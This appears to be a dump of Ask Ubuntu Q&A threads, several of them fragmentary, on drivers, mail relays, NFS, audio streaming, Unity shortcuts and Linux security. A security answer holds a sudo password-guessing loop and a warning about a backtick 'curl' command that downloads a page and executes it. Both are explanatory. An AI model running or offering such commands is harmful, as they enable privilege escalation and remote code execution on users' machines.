internet\n        done\n        #when it is back\n        current_time=$(date)\n        echo \"Internet is back        @ $current_time\" >> /mnt/data/Server/internet_log.txt\n        body=$(tail -2 /mnt/data/Server/internet_log.txt)\n        echo \"$body\" | mail -s \"Internet is back online\" your_email@gmail.com\n    fi\n    #echo Internet is online\n    #wait 60 seconds\n    sleep 60\n        done\n\n\n*Then I run the commands below to add to the start-up:\nsudo update-rc.d testcon defaults\nsudo update-rc.d testcon enable\n\n\n*Reboot\n\nA: Checking whether Internet is working is not so trivial. ping is ICMP, so it might work even if the web proxy is down.

I have tried installing the proprietary ATI drivers, but these do not seem to work properly. It seems to screw up the gnome desktop, and starts booting into terminal. I'm somewhat of a linux newbie, so not really sure whats going wrong.\nI don't want to game on ubuntu, I just want it to recognise my dual monitor setup rather than mirroring the monitors, so any driver that does this is fine by me. \nIt seems like the open source ATI radeon drivers will not support the 6950/6970 for some time, at least until kernel 2.6.38 is released. \nThe card is also flashed with the 6970 firmware, not sure if this is important.

While support for this touchpad has improved quite a bit since I bought my MSI X-Series notebook, it's obviously incomplete, as you noticed.  From what I've gathered in that bug report, Sentelic released an open source Linux driver for the touchpad awhile ago, which has been partially merged into the Linux kernel.  Unfortunately, from comment 71 of the bug report, it sounds like Sentelic has also raised patent concerns, which seem to be blocking the current development of the open source driver.\nThe ultimate goal, at least from what I've read on the mailing list, is to hand off the control of scrolling (and multi-touch?) to the Synaptics driver.  And to quote the bug report one more time, \"To fix this bug properly, Sentelic’s source for absolute positioning needs to be re-added to the driver.\"\nRight now, I don't know of anyone actively working on this, but I'm in the same boat as you, and I would love to have multi-touch (or at least usable edge-scrolling) working on my laptop.  Maybe we should start bribing people. :)\n\nA: 3 solutions you might want to give a shot:\n\n\n*\n\n*Try GPointing-Device-Settings. It is the successor of GSynaptics, and has a wider range of hardware devices supported (it is not limited only to Synaptics)\n\n*Upgrade your kernel to (at least) 2.6.32. Thats the default in Ubuntu 10.04 and beyond. Quoting from Gentoo Wiki: The Sentelic touchpad comes with a couple of laptops/Netbooks. They have recently released a driver for linux that will need patching the kernel. Note: From 2.6.32 the driver is included in the kernel \n\n*Try this official driver. There is a detailed how-to at http://ubuntuforums.org/showpost.php?p=9603498&postcount=3\nI hope one of them works for you! :)\n\nA: Unfortunately I can only give you a half answer but it might be a good pointer - no pun intended.\nThe Sentelics touchpad is not a Synaptics touchpad. Different hardware, different drivers - both for Windows and for Linux. You need to uninstall all the synaptics stuff - well you don't need to but it isn't doing anything :)\nYou don't say which version of Ubuntu you're running - I use 10.10 on my laptop that has a Synaptics touchpad and 11.04 with Unity switched off because it's dreadful on the Sentelics machine. I presume you are using Lucid (10.04) or above. Otherwise there is a bit of extra stuff to do which I don't know as the support for this type of driver is not in the kernel :(\nBut if you are on Lucid or above... try this:\nhttp://sourceforge.net/projects/fsp-lnxdrv/\ndownload the appropriate version for you - i386 for a 32-bit ubuntu or amb64 for 64-bit ubuntu or static build and build your own if you are using something more exotic. I use gdebi to install these sorts of things, you can use the command line it makes very little difference. Then go to the command line and type \"sudo fspc\" and up pops the driver window.\nIt's not brilliant. But it's much better than what you have now :)\n\nA: I have a asus zenbook ux31e also with a sentelic touchpad, from this page https://help.ubuntu.com/community/AsusZenbook#Sentelic_touchpad_synaptics.2BAC8-multitouch there is some useful info:\nReuben Bond has begun work on a synaptics driver for the Sentelic touchpad on github.com/ReubenBond/sentelic-multitouch but is awaiting further documentation from Sentelic regarding the multi touch.\nAlso, Oskari Saarenmaa has managed to get two finger scrolling working in his git repo at https://github.com/saaros/sentelic/, which Chris D aims to refine further in his fork at github.com/thaelim/sentelic.\nPeople do appear to be working on it, but I tried the last two patches, and they are both terrible as of jan 4, 2011.

However, apparently it doesn't exist in the repos anymore. Then this post mentioned that gtkglarea solved their problem, as mentioned in this file.\nOf course that poster neatly forgets to mention exactly what and how gtkglarea solved their problem, and Google is mostly devoid of information on the problem.\nSo I come here asking for help! I would like to install fsv, but it tells me gtk-config doesn't exist. How can I fix this problem in Ubuntu 10.10?\nThanks!\nEDIT\nSo with the help of Robert, this is what I had to do:\nFrom the Dapper repositories I downloaded:\nlibgtk1.2-dev_1.2.10-18_i386.deb\nlibgtk1.2_1.2.10-18_i386.deb\nlibgtk1.2-common_1.2.10-18_all.deb\ngtkglarea5-dev_1.2.3-2ubuntu4_i386.deb\ngtkglarea5_1.2.3-2ubuntu4_i386.deb\nlibglib1.2_1.2.10-10.1build1_i386.deb\nlibglib1.2-dev_1.2.10-10.1build1_i386.deb\nthen I had to install:\n\n\n*\n\n*libglib1.2\n\n*libglib1.2-dev\n\n*libgtk1.2-common\n\n*libgtk1.2\n\n*libgtk1.2-dev\n\n*gtkglarea5\n\n*gtkglarea5-dev\n\n\nI used sudo gdebi <file>.deb for most of them (it tells you dependencies better, if you missed one). In a few cases, gdebi does not do the right thing, and dies. When this happens, use dpkg -i <file>.deb and it should work.\n\nA: If the library is still used or wanted by someone, how can it be obsolete??\nI had the same problem building mozilla 1.7.13 (yes, the old mozilla browser).\nI've got round this in 10.10 manually installing the dapper package and all dependencies:\nhttps://launchpad.net/ubuntu/dapper/i386/libgtk1.2-dev/1.2.10-18\nyou'll need:\nlibglib1.2_1.2.10-10.1build1_i386.deb\nlibglib1.2-dev_1.2.10-10.1build1_i386.deb\nlibgtk1.2-common_1.2.10-18_all.deb\nlibgtk1.2_1.2.10-18_i386.deb\nlibgtk1.2-dev_1.2.10-18_i386.deb\n\n\nA: There is an updated version of fsv to be found on GitHub: https://github.com/mcuelenaere/fsv. It has been modified to work with GTK 2.0 and works for me on Linux Mint 13 (using Ubuntu 12.04 packages)\n\nA: that software is unmaintained and requires GTK1 which is an obsolete graphical library version, it is not available from the Ubuntu repositories and I am not aware of any repository providing it.\nI would recommend you to contact the software author and check with him if there is an upgrade planned, or otherwise search for a maintained similar software.\n", "Q: XFCE session with GNOME in background I recently installed XFCE on my Ubuntu 10.04 and it runs finely but with an issue. \nEverytime I login into my XFCE session I see the background image of GNOME session and after few seconds it disappears which gives me the impression that XFCE session is running over an already running GNOME session.\nIf that is really the case then it might also be eating into my system's RAM which could be a bug.\nAll helps and suggestions are welcome.\n\nA: If I have understood your question, the background image that you think is of the GNOME session is only the background image of the GDM (the graphical login) that will be changed when the desktop envinronment is ready.\nSo if at the GDM login you choose the XFCE session don't worry : GNOME hasn't started. \n", "Q: What is the difference between the \"Entire Partition\" and \"Entire Disc\"? I want to install Ubuntu alongside my Windows 7 operation system.\nDuring installation I have three options:\n\n\n*\n\n*Install alongside the existing OS.\n\n*Remove everything and install Ubuntu.\n\n*Manual partitioning (advanced).\n\n\nThe above list is not precise (I do not remember what exactly was written there and I just write options as I have understood them).\nI know that option 2 is not mine. So, I need to choose either 1 or 3. I do not know which one I need to choose. I want to have a possibility to manually specify space assigned to Windows and Ubuntu (for example 40% for Windows and 60% for Ubuntu).\nI chose the 1st option and I saw a window with the following information.\nAllocate drive space by dragging the drive bellow.\nFile (48.1 GB)             Ubuntu\n/dev/sda2 (ntfs)           /dev/sda3 (ext4)\n286.6 GB                   241.7 GB\n\n2 small partitions are hidden, use the advanced partitioning tool for more control.\n\n[use entire partition]     [use entire disk]\n\n                                         [Quit]   [Back]   [Install Now]\n\nMy problem is that I do not understand what I see. In particular I can press [use entire partition] or [use entire disk] and I do not know what is the difference. Moreover, as far as I understand, I can even press [Install Now] without pressing one of the two above mentioned buttons. So, I have 3 options. What is the difference between them?\nThe most important thing for me is not to delete the old operation system with all the data stored there.\n\nA: [use entire partition] uses your currently selected partition and automatically creates partitions for Linux (root and swap, at least).\n[use entire disk] is your option 2: remove everything and install Ubuntu, using whole disk. This will also automatically create partitions for Ubuntu. Difference is that it'll first remove all old partitions.\n[Install now] is possible, if you already configured (manually or automatically) partitions (sizes, filesystems and mount points). If you didn't, it'll complain and tell what's missing.\nBefore making changes to your disk, remember to backup important files. There's always risk you'll choose wrong and delete important things.\n\nA: You want neither option and they should not be there.  This is a known defect in 10.10.  When you choose install along side, it shows you a slider so you can set the relative size of the two halves of your existing windows partition, which will be split in two: one for Windows, and one for Ubuntu.  Use entire partition means to take over the Windows partition, and replace it, instead of splitting the partition.  Use entire disk should be obvious.\n", "Q: Will there still be a separate Netbook edition after Unity becomes the default desktop environment? After a long time of enjoying the bliss of ignorance I've been reading up a bit on the developments in the land of desktop environments.\nOne thing I didn't find was whether there will still be (a need for) a separate netbook edition once Unity becomes the default environment on the Ubuntu desktop.\nSurely someone here can tell me what I need to know?\n\nA: Judging by Gerry Carr's Canonical Blog post as of Ubuntu 11.04 there will no longer be separate Ubuntu versions.\n\nOne of the benefits of the direction\n  that’s been taken with the next\n  release of Ubuntu is that there is no\n  longer a need for a separate netbook\n  edition. The introduction of the new\n  shell for Ubuntu means that we have a\n  user interface that works equally well\n  whatever the form factor of the PC.\n  And the underlying technology works on\n  a range of architectures including\n  those common in netbook, notebooks,\n  desktops or whatever you choose to run\n  it on. Hence the need for a separate\n  version for netbooks is removed.\n\nEven the name will simply be Ubuntu instead of Ubuntu Desktop Edition in the future.\n", "Q: Will there be an App-Indicators Repository in Ubuntu 11.04? I heard that panel applets will be disabled in Ubuntu 11.04 and there will be indicators only. In Maverick we can right click and add panel applets and I use them a lot. So will there be a similar repository or some other way so that we can add new indicators? Thanks!\n\nA: There aren't any plans for collecting \"cool little applets\" in one place for 11.04. \nIf an application uses the indicator area it will either just use it or give you an option to use it in it's preferences.\n", "Q: Custom GNOME applet in Python needs to have root privileges I've written a custom GNOME panel applet in Python that needs to write to some root-owned files. Is there a way to make it start with root privileges without using suid?\n\nA: You can do this with PolicyKit.\n\n\n*\n\n*Library Reference\n\nA: Better solution: do not run whole applet with root permissions. Put everything possible to applet which is running with normal user permissions. Create separate program that modifies necessary files, and run that through sudo (or suid).\nFor sudoers configuration, run visudo. Try something like\nyourusername ALL=(ALL) NOPASSWD: /usr/local/bin/your_command.py\n\nTo allow running specific commands with root permissions.\n\nAnother way: add file acl to those root owned files to allow changes by your user.\nSee man setfacl for more information (from package acl).\n\nA: You should separate the procedures that require root access into a separate python program and launch that with gksudo.\nI asked a similar question on Stack Overflow.\n", "Q: Getting function keys working on Samsung RV510 notebook I installed 10.10 on my Samsung RV510 notebook, but the function keys don't work.

I do not want to go back to Windows.\n\nA: there are two main problems, i had too and i fixed this way:\n1) you have to force release of the keys (search internet)\n   Pratically you have to add your exaxct pc model name to the file\n   /lib/udev/rules.d/95-keyboard-force-release.rules\nto take exact name of the pc run:\nsudo dmidecode -s system-product-name\n\nThen add the model like this on the file:\nENV{DMI_VENDOR}==\"[sS][aA][mM][sS][uU][nN][gG]*\", ATTR{[dmi/id]product_name}==\"*N128*|*N130*|*N140*|*N210*|*N220*|*SR70S/SR71S*|*YOURMODEL*\", \nRUN+=\"keyboard-force-release.sh $devpath samsung-other\"\n\n2) Install voria's samsung-backlight module:\nhttp://ubuntuforums.org/showthread.php?t=1673864\nHope is useful.\nAndrea.\n\nA: Edit:  I just made the Fn keys work!\nYou don't need the script (..what a good finding) so you did success to:\n\n\n*\n\n*Made the keys works?

Is it possible to make chrome or chromium (as that comes default in the repos) to use the Gnome seahorse as password vault? \nI have not found a way to do this for Firefox either, but maybe a solution for Firefox will lead to a solution for Chrome. \nFYI: Epiphany is properly integrated into Gnome by default, and does use the default password vault. It would be great to at least have all passwords in a single, actually secure, place, instead of laying around in my home-dir.\nEven better would be if somehow they could re-use eachothers passwords, but that depends on the implementation of this integration, i guess.\n\nA: Well this doesn't answer the question but may be appreciated.\nThere is a nice addon called Lastpass.\nIt works on IE, firefox and chromium (and there are some kind of javascript bookmarks to enable its functionning on non supported browsers).\nTrue that nothing to do with seahorse.\nBut autosync between firefox and chromium (your last will) and also autosync between computers (windows included).\nMany secure features (generate password, receiving mails on password changes, etc).\n\nA: According to http://www.omgubuntu.co.uk/2010/07/chrome-dev-channel-adds-gnome-keyring-support-for-saving-passwords/ , that is available, you will need to update the chrome launcher to use –password-store=gnome.\nThere was a Firefox addon providing gnome keyring integration, I can no longer find it.\nEDIT: Added link to Firefox addon code and bugzilla ticket\nhttps://github.com/mdlavin/firefox-gnome-keyring\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=309807\n", "Q: How do I make k3b burn an audio CD with MP3 files?

Ubuntu 10.10 with GUI.\n\n\nWhat I'd like is my laptop connecting to the nfs (or any other mountable networked filesystem) so that Banshee sees all the music, new podcast-entries (and video) from that media-server.\nI already have firefly (mt-daapd) running, which works, but is flakey on both server-side and client-side. But its biggest downside, is that I cannot easily fix metadata on files on the media-server this way. DAAP is read-only by design.\nI can mount nfs manually, through a sudo mount /media/nfsmultimedia/. I am not looking for a manual, or howto on setting up a NFS client and server. Merely a way to have this more transparently working. \nObviously I'd like the NFS to be unmounted if the network is no longer available (i.e. when I open my laptop-lid on my clients buro).\nIt may be, that an NFS is not suited for this, in that case, I'd love to hear other options. :)\n*) Actually: I also have a fileserver, backupserver and webserver to which I'd like to connect in a somewhat similar way. Right now I connect to these over SSH, using gvfs.\n\nA: You could try playing around with AutoFS. It will let you set the NFS shares and it'll handle mounting them on demand. It's a pretty good system once it's up and running but that's not to say you won't have issues.\nOne thing that is apparent to me is Banshee might struggle with a library that keeps expanding and contracting as AutoFS connects and disconnects. It might have the net effect of removing half your library and then needing to re-add it. If this happens, you might lose library-specific data (eg playcounts, ratings, etc). It might not have this problem though. I haven't tested it.\n", "Q: How to check the information of current installed video drivers?

I have twin netbooks both with PulseAudio and fairly no name hardware from intel. How I set it up went a little something like this.\nrun paprefs on both your server and client. On the server, make sure you have have the multicast settings enabled, and the server bits checked. like so\n\nand the multicast bit\n\nOn the client, enable the bit about finding network enabled devices\n\nand set your output device to the virtual network device via pavucontrol\n\nviola you should have some magic now\n\nA: Your best option is called Music Player Daemon (mpd).\nhttps://secure.wikimedia.org/wikipedia/en/wiki/Music_Player_Daemon\nIt is a client server application. You store your music on the server, then connect with your clients (lots of people can do it at once) and control the server.\nIt is already in ubuntu, just apt-get install mpd\nAnd also some good documentation:\nhttps://wiki.archlinux.org/index.php/Mpd\nMPD can stream music, so you can have lots of clients (or speakers if you so wish to call them) to play the music.\nBut don't really expect any good quality. Streaming spoils sound badly (no matter if you use mpd or pulseaudio). It's a much better idea to connect real speakers to the server and use the laptops only to control it.\n\nA: With this solution you can stream your system audio whereever you want..\nthe key here is the ALSA loopback capabilities. so first you need to enable loopback device in ALSA, which will appear in the PulseAudio Volume Control as an input device (and an output device as well). \nsudo modprobe snd_aloop\n\nthis device then can be added to an mpd server:\nmpc add alsa://hw:1,1\n\nwhere hw:1,1 is the loopback input device can be listed with the command aplay -l\nthen you need to configure a http output plugin for the mpd. the following example would look like in /etc/mpd.conf\n audio_output {\n    type            \"httpd\"\n    name            \"My HTTP Stream\"\n    encoder         \"vorbis\"          # optional, vorbis or lame\n    port            \"8000\"\n    bind_to_address \"192.168.1.38\"               # optional, IPv4 or IPv6\n    quality         \"5.0\"                   # do not define if bitrate is d$\n#   bitrate         \"128\"                   # do not define if quality is d$\n    format          \"44100:16:1\"\n    max_clients     \"0\"                     # optional 0=no limit\n }  \n\nthat is it. Select the looback device for your audio source in Volume Control Playback tab.\nFinally, you can use VLC or any other stream renderer at the destination point using the httpd url address: http://192.168.1.38:8000\nThis answer is also available here\n\nA: To add to lazyPower's answer I' would like to comment that the \"pulseaudio server\" is where the audio devices are located (in my case it's the bluetooth headphones connected to laptop) and the \"pulseaudio client\" is where the audio is played to the network selecting the audio sink device.\nI spent a few hours before realize that.\n\nA: I'm not sure if something like this can be achieved with DLNA/UPnP since I'm not familiar with it myself, but throwing some links here in case it helps:\n\n\n*\n\n*UPnP AV media server (Wikipedia)\n\n*Digital Living Network Alliance / Specification (Wikipedia)\n\n*DLNA Open Source Projects (elinux) \n\n*List of open source DLNA/UPnP AV software devices (jorgenmodin.net)\n\n*List of UPnP AV media servers and clients / Linux clients (Wikipedia)\nThough a quick search result would suggest that it's not possible to sync...\n\nA: There is no good solution(yet). There is AVB but its support for 802.11 is limited to time synchronization.\n\nA: If you want to stream to an Android phone, you can use Foobar2000 on the server and BubbleUPnP (payware) on the client.\n\n\n*\n\n*get Wine\n\n*get foobar_v1.2.5.exe\n\n*$ wine foobar2000_v1.2.5.exe\n\n*next, next, next... :)\n\n*get foo_upnp\n\n*extract in the components folder of foobar2000 (which probably is in ~/.wine/drive_c/Program Files/)\n\n*launch foobar2000\n\n*go to Library→Configure→Playback→Output→Device and select \"Null output\"\n\n*make sure ufw is not blocking the relevant traffic\n\n*in BubbleUPnP:\n\n*\n\n*go to Devices→Libraries and select the foobar2000 server\n\n*in \"Library\", select \"Playback Stream Capture\"\n\n\n\nThe approach has the advantage that if you pause on the Android, it will accummulate a buffer (since the server is still sending).\nTested on Ubuntu (Wine version 1.5.28-0ubuntu1~ppa1) and Windows.\n", "Q: How do I setup sendmail, postfix, or dovecot so that perl can send emails? Direct Question: I want to enable Perl to send emails. What package(s) should I install to setup a simplistic email server: no need for incoming, only outgoing.  I can forward through gmail's SMTP if that's best?\nBackground: I am programmer with a nightly build script written in Perl.  I would like to email myself the results of my nightly builds (especially if there's an error).\nI've read about the perl package Mail::Sendmail briefly, but if something else is more appropriate, please tell me!!\nI tried the simple aptget install sendmail, but that doesn't seem to work. I get the following errors:\nServer said: 421 4.3.0 collect: Cannot write ./dfp1PFXl7W020719 (bfcommit, uid=0, gid=120): No such file or directory\nmessage transmission error (421 4.3.0 collect: Cannot write ./dfp1PFXl7W020719 (bfcommit, uid=0, gid=120): No such file or directory\n)\nServer said: 421 4.3.0 collect: Cannot write ./dfp1PFXl7W020719 (bfcommit, uid=0, gid=120): No such file or directory\nI've googled this problem a bit and tried a few things -- adding my username to /etc/mail/trusted-users and such, but to no avail.\nIn other words, I would be most grateful if you could provide simple instructions for setting up an outgoing mail server.  I really don't understand the specifics, but as I understand, I need to forward the mail through an existing SMTP server -- so I can use my gmail account if need be (that's where I want to send the logs anyway).  Any suggestions would be most greatly appreciated.\n\nA: All of them are too much tool for the job. ssmtp does this - but only this.\nsudo apt-get install ssmtp\n\n(This will remove postfix or sendmail if installed.)\nsudoedit /etc/ssmtp/ssmtp.conf\n\nAnd the contents of that file:\nRoot=your_email@gmail.com\nMailhub=smtp.gmail.com:465\nRewriteDomain=gmail.com\nAuthUser=your_gmail_username # (before the @gmail.com part)\nAuthPass=your_gmail_password\nFromLineOverride=Yes\nUseTLS=Yes\n\n\nA: I still maintain that dovecot-postfix is easy to install and configure.\nI have some more detail in my answer to Is There a Simple Mail-Server I Can Install?\nThere, EmmyS was able to get this to work for her phpmail function. \nDovecot-postfix does more heavy-lifting than perhaps you need, but it takes just a couple of configuration items after: \nsudo apt-get install dovecot-postfix\n\n\nA: It seems there are many mail servers running, could you try to shutdown sendmail?\nsudo /etc/init.d/sendmail stop\n\nand check your smtp port (25) with\nsudo lsof -i -P -R | grep ':25 '\n\nif you see the port 25 there is another process running, try to stop it. The pid is in the third column of the output.\nTo properly configure postfix:\nset to low level debconf\nsudo dpkg-reconfigure debconf\n\nchoose dialog and then low level of warning.\nThen install postfix with\nsudo apt-get install postfix \n\nchoose the standard option with \"Internet site\" profile.\nIf you have installed postfix previously you can reconfigure it by:\nsudo dpkg-reconfigure postfix\n\nEnjoy!\n\nA: For the perl side Perl::SendMail will work if you have a local relay like SSMTP, or any other similar program.  It does not appear to do authentication.\nI found a post on Sending email via GMAIL using Perl.  Please be aware that the code will have your Google credentials. (As will SSMTP or whatever other relay you use.)\nI would suggest you use your ISPs relay server to send the mail.  You could use Perl::Sendmail standalone in that case.  \nRecommended solution:\nPostfix gets installed as a dependency by many programs requiring a mail server.  If it isn't already installed, install it or Exim4.  Configure your server for \"mail sent by smarthost; not local mail\" using your ISP's relay as the smarthost.  Configure /etc/email-addresses for you userid.  Also configure /etc/aliases to forward email to your gmail account. \nIf you use cron to run you build any output to either stdout or stderr will be emailed to you.  You can also use mailx to send mail if you want to send mail from a script.\n\nA: You could also look at Net::SMTP which allows you to send SMTP messages without requiring any external programs such as sendmail. This might be a little off-topic for Ask Ubuntu as this is a pure Perl solution, but you might find it preferable. Net::SMTP is provided by the perl-modules package, which should be installed by default.\n", "Q: Why is it not possible to burn a multisession DVD using brasero?

I need to add the System Monitor applet to the Gnome Panel in Ubuntu Netbook Edition. My setup is as following: 10.10 (upgraded from 10.04) with Netbook Edition interface installed instead of Unity.\nI've tried the method of symlinking Netbook Edition interface so that it would start in the Gnome session mode but the panel was not customizable anyway. Seems that the panel is more locked in 10.10 than in 10.04.\nI suppose that the panel still keeps its applet configuration somewhere, either in config files or in gnome-config.

I understand that if any malware made it's way into a Linux system, it will, at most, gain a user-level privilege and ruin anything within the particular user's reach, i.e. the user's own files.\nBut what exactly keeps the malwares from gaining root-level access? Can it not somehow crack the password from within?\n\nA: This is a complex question. There are lots of different layers of security in a Ubuntu system, from complex frameworks like AppArmor to humble kernel variables like mmap_min_addr. You can add some kernel features like memory randomization in the mix. You can find a list of them along with a quick explanations on the Ubuntu Wiki.\nAnother important factor is that the updates are both fast and easy - so most computers will be updated to the last security fixes.\nAs far as I know, an attacker that has gained local access to your computer has three ways to scale the kernel privileges:\n\n\n*\n\n*Crack the password. But this is going to be really difficult, the password is stored encrypted, using algorithms with no known flaw. It will take ages to crack it.\n\n*Bug in the kernel. But all the security features of the kernel will get in the way.\n\n*Trick the user to give away the password, i.e. social engineering. Just show a fake password dialogue or use some other trick. This is the easiest way to do it.\nThe third point is the weakest vulnerability right now.\n\nA: Cracking the root password itself is not possible, because Ubuntu disabled the root user by default. However, if your user can become root through sudo and your password is easy to guess/brute-force, you've an insecure system. Example script trying to test some password:\n#!/bin/sh\nfor pass in password 123 ubuntu pass; do\n    echo $pass|sudo -S evil_command\ndone\n\nAdding an untrusted repository allows programs from that repository be installed. Even if you do not explicitly install an application like sudo apt-get install [app-from-repo], the repository can still affect other programs by making Ubuntu believe that the repository contains a newer version of a certain program.\nThe update process is run as root, otherwise files could not be written to /usr/bin or /etc. An installation trigger is run as root too and can run arbitrarily, and possibly, harmful commands. Now, do not get worried, manual action is needed to update programs and the Ubuntu repositories are safe. Closed-source software like Windows can never be fully trusted because you cannot check the source for malicious code, but you can review the source of Ubuntu application if you need to (does not apply to proprietary programs like sun-java6 or Flash).\nAs mentioned by Javier Rivera, kernel bugs can lead to arbitrary code execution, but bugged software are possibly dangerous as well, especially buggy setsuid root binaries (binaries which will run under file owner, root) and other buggy programs running as root.\nYou can create security holes on your system if you do not pay attention to what you're doing. For example, without fully understanding the concept of cronjobs, you've added a cronjob to /etc/cron.daily which runs a program in your home folder (e.g. /bin/sh /home/your-username/myscript.sh. If the myscript.sh file is writable by you can be deleted by you, an exploit could put malicious code in myscript.sh which would be run as root (privilege escalation).\nTo stay safe, use your mind! Do not run commands from untrusted sources if you do not know what it does. If someone says run `curl 3221233674` with back-ticks, do not. 3221233674 is another way to write 192.0.32.10 (IP of example.com). So, it would be equal to:\n`curl http://example.com/`\n\nThose back-ticks causes the output be executed as shell commands. In plain English, \"Download the page http://example.com/ and try to execute the downloaded page\".\nAt first, you wouldn't see something malicious in the given command. But now, you know it can be abused too.\nAlways check commands/script you get from untrusted sources, like the Internet.\n", "Q: Where can I find \"System properties settings\"?

What a question.\nI have several nVidia based graphic cards with both 512 MB and 1024 MB in different systems, and both are good for playing high definition video files. The best, of course, is the 1024 MB card, which is not expensive at all.\nYou may experience a better performance starting at 1024 MB video card. And I am talking to those times when you wish to play a high definition video and do something else. Or when using two monitors to extend the desktop, etc.\nThere are new video cards with DDR3 memory systems which will absolutely work better than DDR2 memory based systems.\nI prefer the nVidia's but I know that ATI's are also good and many people prefer ATI over nVidia and I have seen an ATI RADEON with 3 GB memory system at work, owned by a gamer friend.\nTake in consideration that any video card starting at 1024 MB memory system will do the work with ease.\nMy nVidia models are: \n\n\n*\n\n*ZOGIS GeForce 8500GT 512MB DDR2 PCI\nExpress\n\n*PALIT 9500GT Super 512MB/128Bit/DDR2\nDual Link DVI/TV-Out PCI Express 2.0\n\n*PNY VERTO GT220 1024MB DDR2 PCI\nExpress\n\n\nAnd my favorite and the one that I am using when writing this is the:\n\n\n*\n\n*PhysX SPARKLE GeForce 9500GT\n1024MB/DDR2/CRT/DVI-I/HDCṔ/SLI/PCI\nExpress 2.0\n\n\nThis graphic card features no fan and a big aluminum heat sink, which makes absolute silently performance and you won't face the problems when the fan fails because of the dust or typical problems on the fan.\nIn this link you can find a screen recording of my system when playing a RAW mpeg HD Video file when using dual monitor view.

But everyone will give you for \"best\" what it fits their needs.\nWhat are your needs?\nTo rip from a DVD as a video source you have many alternatives.\nAcidRip at http://sourceforge.net/projects/acidrip/\n\nDVD Encoder OgmRip at http://ogmrip.sourceforge.net\n\nDVD::Rip at http://www.exit1.org/dvdrip/\n\nMore of DVD::Rip\n\nHandBrake at http://handbrake.fr\n\nBrasero will allow you to burn all the ripped files by using:\nData project: Drag and drop the files to the window in order to make a DVD, if you ripped the whole DVD you will have VIDEO_TS and probably AUDIO_TS which can be added to this project in order to make a copy of the DVD.\nVideo project: If you ripped the video into a video file (avi, mpeg, etc.) You can make a video DVD using this feature.\nBurn image: If you have made an ISO, which can also be made by Brasero.\n\n\nEdited:\nBased on the commend by Seth Hikari I am increasing the list of software in order to add those who can help to do what Seth wish.\nThere are also a few alternatives for Professional DVD Authoring, which will allow you to:\n\n\n*\n\n*Add video from different\nsources/codecs.\n\n*Edit DVD Menus (or choose not to\ninclude a menu)\n\n*Edit a few more things and...\n\n*Burn to a DVD disc which will be\nreaded by the majority of the\ncommercial DVD Player Decks.\n\n\nBombono at http://www.bombono.org/\n\nDVDStyler at http://www.dvdstyler.org/\n\nThese tools are good and fast for DVD burning, and taking in consideration the lots of control that you get when using a DVD authoring tool, compared with Brasero will result in a faster process.\nAs I said before, this is the \"Best Tools\" for me, so... I hope you don't downvote me, and people not to drop their unpleasant \"reviews\" to my answer. ¬¬\nGood Luck!\nThis answer can be edited in order to remove all the stuff that people may consider not necessary.

I tried installing samba/nmbd as suggested in another post, but to no avail.\n\nA: You have to have the other machines on the network referring to a shared authority, whether it is DNS, synchronized host files, or some other method (e.g., avahi).  \nThe command you are running on the other systems, host, is a DNS utility : \n\nhost is a simple utility for\n  performing DNS lookups. It is normally\n  used to convert names to IP addresses\n  and vice versa. When no arguments\n  or options are given, host prints a\n  short summary of its command line\n  arguments and options.\n\nAs far as the other machines on the network are concerned, it doesn't matter what your machine is referred to locally.  You have to have the host/IP registered to a common system.\n\nA: If you have a small number of other hosts that need to access the server by name, you can simply add a line to each of their /etc/hosts files:\n10.49.156.196 ca \n\nThis is really just setting up an alias on each of those machines, but it's far quicker than learning to manage a DNS server and will work on OSX or windows clients as well (\\windows\\system32\\drivers\\etc\\hosts).\n", "Q: Ubuntu Server On Airlive Access Point Device Is there anyway to install Ubuntu (server) on Airlive WL-5460AP access point device?\n\nA: With 2MB Flash, 16MB SDRAM and an unknown processor architecture, I'm going to have to say no. The server kernel alone would fill this several times over.\nThis really isn't the level of device that Ubuntu is aimed at. For this you want something like DD-WRT, although on their forums the requirements are still too restrictive even for that.

In Unity, are there any pre-defined shortcuts, e.g. to open the dash or unhide the launcher?\n\nA: Cheat sheet here . Credits to Chase Seibert\n\n\nA: There is a feature in development for 12.04 so that when you long-press the Super key, a detailed overlay of possible shortcuts will appear.\nAlso notice the numbers appearing besides the application icons in the launcher dock on the left.  Super + Number is a short cut to that specific app, to save you from Alt + Tab madness when rapidly switching between three or more apps (such as while programming).\n\n\nA: This page will document the keyboard shortcuts and mouse tricks for Unity. Please feel free to add more!\nRead this first to get familiar with the UI elements of Unity and to find the right keys on your keyboard:\n\n*\n\n*Unity Terminology\n\n*What are the meta, super, and hyper keys?\nKeyboard Shortcuts\nHolding down the Super key will get you a keyboard overlay that documents most of these.\nLauncher\n\n*\n\n*Hold Super - Invoke the Launcher and display the shortcuts\n\n\n*Hold Super, then press 1 or 2 or 3 and so on until 0 to open or focus an application. The number corresponds to the location of the icon on the launcher from top to bottom.\n\n*\n\n*Adding Shift will open a new instance of the application if it's already open.\n\n*Holding the key is also useful when you want to get to the Launcher but do not want to invoke the Dash.\n\n\n\n*Super + T - Open the rubbish bin/trash can.\n\n\n*Alt + F1 - Put keyboard focus on the Launcher, use arrow keys to navigate, Enter launches an application, Right arrow exposes the quicklists if an application has them.\n\n\n*Ctrl + Alt + T - Launch a terminal window.\nDash\n\n*\n\n*Tap Alt - Opens the HUD\n\n\n*Hold Alt - Reveals application menu\n\n\n*Tap Super - Opens the Dash. The open signal is sent when you let go of the key, not when you push it down, so if it feels slow just let go of the key earlier.\n\n\n*Over an item, you can hit the Secondary key (commonly to the left of the right Ctrl) to see a preview of the item, as you can do with a secondary click over it.\nUbuntu 11.10 (Oneiric Ocelot)\n * <kbd>Tab</kbd> Move to the next lens (When the dash is open)\n * <kbd>Shift</kbd>-<kbd>Tab</kbd> Move to the previous lens (when the dash is open)\n\nUbuntu 12.04+\n * <kbd>Ctrl</kbd>-<kbd>Tab</kbd> Move to the next lens (When the dash is open)\n * <kbd>Ctrl</kbd>-<kbd>Shift</kbd>-<kbd>Tab</kbd> Move to the previous lens (when the dash is open)\n\n\n*\n\n*Alt + F2 - Invoke the Dash in a \"special mode\" to run a command. Typing in a folder name will find that folder in Nautilus, you can also use ~ as a shortcut in the field.\n\n*The Dash opens with focus on the search box to find applications and files. Using the arrow keys will navigate the results, use Enter to launch. Hitting Enter twice in rapid succession after a search term will automatically launch the first match in a search, even if it's still ongoing. (Basically a dash version of \"I'm feeling lucky\").\n\n*Super + A - Open Applications lens\n\n*Super + F - Open Files & Folders lens\n\n*Super + M - Open the music lens\n\n*Super + V - Open the video lens\n\nPanel\n\n*\n\n*F10 